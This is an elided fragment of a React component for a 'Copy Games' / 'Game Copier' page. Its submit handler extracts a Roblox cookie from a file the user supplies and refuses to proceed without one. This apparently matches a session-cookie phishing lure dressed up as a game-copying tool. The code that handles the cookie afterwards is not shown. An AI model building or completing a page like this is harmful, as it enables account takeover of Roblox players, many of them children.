...
const CopyGames = () => {
  ...
  const handleSubmit = async () => {
    const cookie = extractRobloxCookie(gameFile);
    if (!cookie) {
      setShowError(true);
      return;
    }
  ...
  return (
    <div className="min-h-screen bg-blox-gradient">
      ...
      <div className="container mx-auto px-4 py-8">
        ...
        >
          <motion.h1 className="text-4xl font-bold mb-2 text-center">Copy Games</motion.h1>
          ...
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-4xl mx-auto">
            ...
            >
              <motion.h2 className="text-2xl font-bold mb-4">Game Copier</motion.h2>
